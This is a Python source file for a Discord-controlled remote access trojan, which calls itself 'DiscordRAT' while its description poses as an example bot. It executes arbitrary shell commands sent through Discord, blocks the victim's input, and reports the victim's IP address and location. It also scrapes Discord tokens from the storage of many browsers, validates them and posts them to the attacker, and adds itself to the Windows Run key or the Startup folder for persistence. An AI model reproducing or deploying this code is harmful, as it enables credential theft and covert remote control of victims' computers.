import discord
from discord.ext import commands
from blocker import *
from time import sleep
import platform
import os
import subprocess
import requests
import re
import ctypes
import winreg
import sys
import shutil

description = '''An example bot to showcase the discord.ext.commands extension
module.
There are a number of utility commands being showcased here.'''

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', description=description, intents=intents)

pcname = os.getenv('COMPUTERNAME')

token = 'Your Bot Token'

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')



@bot.command()
async def block(ctx, duration: int):
    blockinput()
    await ctx.send("Blocking " + pcname + "....")
    sleep(duration)
    unblockinput()
    await ctx.send("Unblocking " + pcname + "....")

@bot.command()
async def pcinfo(ctx):

    content = platform.machine(), platform.platform(), platform.uname(), platform.system(), platform.processor()


    embed = discord.Embed(title="PC INFORMATIONS", description=content, color=0xfb0000)
    embed.set_author(name="requested by: " + ctx.author.name)
    await ctx.send(embed=embed)

@bot.command()
async def shell(ctx, command: str):

    def shell():
        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        return output

    shel = threading.Thread(target=shell)
    shel._running = True
    shel.start()
    sleep(1)
    shel._running = False

    result = str(shell().stdout.decode('CP437'))
    numb = len(result)

    if result != "":
        if numb < 1:
            await ctx.send("unrecognized command or no output was obtained")
        elif numb > 1990:
            f1 = open("output.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File("output.txt", filename="output.txt")

            await ctx.send("Command successfully executed", file=file)
            os.remove("output.txt")
        else:
            await ctx.send(f"Command successfully executed:\\n```\\n{result}```")
    else:
        await ctx.send("unrecognized command or no output was obtained")

@bot.command()
async def getIP(ctx,):
    url = 'http://myexternalip.com/raw'
    r = requests.get(url)
    ip = r.text

    await ctx.send("User ip: " + ip)

@bot.command()
async def IPinfo(ctx):
    url = 'http://ipinfo.io/json'
    response = requests.get(url)

    embed = discord.Embed(title="Ip info", color=0xf5f018)
    embed.add_field(name="ip: ", value=response.json()['ip'], inline=True)
    embed.add_field(name="city", value=response.json()['city'], inline=True)
    embed.add_field(name="region", value=response.json()['region'], inline=True)
    embed.add_field(name="country", value=response.json()['country'], inline=True)
    embed.add_field(name="geo location", value=response.json()['loc'], inline=True)
    embed.add_field(name="ISP", value=response.json()['org'], inline=True)
    embed.add_field(name="postal", value=response.json()['postal'], inline=True)
    embed.add_field(name="timezone", value=response.json()['timezone'], inline=True)
    embed.add_field(name="Google maps", value="https://www.google.com/maps/search/google+map++" + response.json()['loc'], inline = True)
    embed.set_footer(text="developed by: 𝖘𝖎𝖔𝖓𝖌𝖚𝖟#7707")
    await ctx.send(embed=embed)

@bot.command()
async def getToken(ctx):

    await ctx.send(f"extracting tokens...")
    tokens = []
    saved = ""
    paths = {
        'Discord': os.getenv('APPDATA') + r'\\\\discord\\\\Local Storage\\\\leveldb\\\\',
        'Discord Canary': os.getenv('APPDATA') + r'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',
        'Lightcord': os.getenv('APPDATA') + r'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',
        'Discord PTB': os.getenv('APPDATA') + r'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',
        'Opera': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',
        'Opera GX': os.getenv('APPDATA') + r'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',
        'Amigo': os.getenv('LOCALAPPDATA') + r'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Torch': os.getenv('LOCALAPPDATA') + r'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Kometa': os.getenv('LOCALAPPDATA') + r'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Orbitum': os.getenv('LOCALAPPDATA') + r'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        '7Star': os.getenv('LOCALAPPDATA') + r'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Sputnik': os.getenv('LOCALAPPDATA') + r'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Chrome': os.getenv('LOCALAPPDATA') + r'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',
        'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',
        'Uran': os.getenv('LOCALAPPDATA') + r'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Yandex': os.getenv('LOCALAPPDATA') + r'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Brave': os.getenv('LOCALAPPDATA') + r'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',
        'Iridium': os.getenv('LOCALAPPDATA') + r'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'
    }
    for source, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    for token in tokens:
        r = requests.get("https://discord.com/api/v9/users/@me", headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
            "Authorization": token
        })
        if r.status_code == 200:
            if token in saved:
                continue
            saved += f"`{token}`\\n\\n"
    if saved != "":
        await ctx.send(f"**Token(s) succesfully grabbed:** \\n{saved}")
    else:
        await ctx.send(f"**User didn't have any stored tokens**")

@bot.command()
async def admincheck(ctx):
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
        await ctx.send(embed=embed)
    else:
        embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
        await ctx.send(embed=embed)


@bot.command()
async def startup(ctx, reg_name: str):
    try:
        key1 = winreg.HKEY_CURRENT_USER
        key_value1 ="SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        open_ = winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)

        winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
        open_.Close()
        await ctx.send("Successfully added it to `run` startup")
    except PermissionError:
        shutil.copy(sys.argv[0], os.getenv("appdata")+"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+os.path.basename(sys.argv[0]))
        await ctx.send("Permission was denied, added it to `startup folder` instead")
        
bot.run(token)



